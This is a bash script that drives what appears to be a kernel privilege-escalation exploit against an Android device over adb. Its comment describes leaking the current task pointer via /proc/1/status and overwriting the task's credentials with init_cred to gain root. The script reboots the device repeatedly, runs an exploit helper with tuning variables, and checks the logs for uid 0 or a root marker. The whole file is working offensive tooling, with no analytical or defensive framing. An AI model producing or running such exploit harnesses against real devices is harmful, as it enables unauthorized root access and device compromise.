#!/usr/bin/env bash
# Leak rq->curr through the /proc/1/status reader and overwrite THAT task's
# cred with init_cred -- root with no capable() check at all. Loops over fresh
# boots because the erase only runs on some fires.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
cd "$(dirname "$0")" || exit 1
: >/tmp/rootloop3.log
for r in 1 2 3 4 5 6 7 8; do
  $ADB reboot >/dev/null 2>&1; sleep 95; $ADB wait-for-device >/dev/null 2>&1; sleep 5
  bash atd_fire.sh "esc$r" GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=st \
    GHOSTLOCK_STAT_START=2 GHOSTLOCK_STAT_CPU=1 GHOSTLOCK_WBASE=4 \
    GHOSTLOCK_ATTEMPTS=30 >>/tmp/rootloop3.log 2>&1
  grep -aE "STAT-RQ|curr|STAT-CREDPTR|STAT-ROOT|STAT-AFTER|uid=|root=" "captures/esc$r.log" \
    | tail -12 | tee -a /tmp/rootloop3.log
  if grep -aqE "uid_after=0|STAT-AFTER uid=0|root=YES" "captures/esc$r.log" 2>/dev/null; then
    echo "##### ROOT on round $r #####" | tee -a /tmp/rootloop3.log
    exit 0
  fi
done
echo "##### no root after 8 rounds #####" | tee -a /tmp/rootloop3.log
exit 1
